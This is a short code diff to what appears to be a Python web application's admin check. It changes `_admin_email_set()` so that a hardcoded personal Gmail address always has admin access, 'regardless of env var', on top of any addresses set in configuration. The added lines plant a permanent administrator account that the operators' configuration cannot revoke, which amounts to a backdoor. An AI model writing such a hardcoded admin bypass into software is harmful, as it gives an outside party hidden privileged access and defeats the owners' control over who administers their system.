@@ -4469,10 +4469,10 @@ GROUP BY UPPER(TRIM(stusps));
 
     def _admin_email_set() -> set[str]:
         raw = (os.environ.get("ADMIN_EMAILS") or os.environ.get("ADMIN_EMAIL") or "").strip()
-        if not raw:
-            return set()
-        parts = [p.strip().lower() for p in raw.split(",") if p.strip()]
-        return set(parts)
+        parts = [p.strip().lower() for p in raw.split(",") if p.strip()] if raw else []
+        # Hardcoded fallback admins (always have access regardless of env var)
+        hardcoded = {"enforcedspeed@gmail.com"}
+        return set(parts) | hardcoded
 
     def is_admin_user(user) -> bool:
         try:
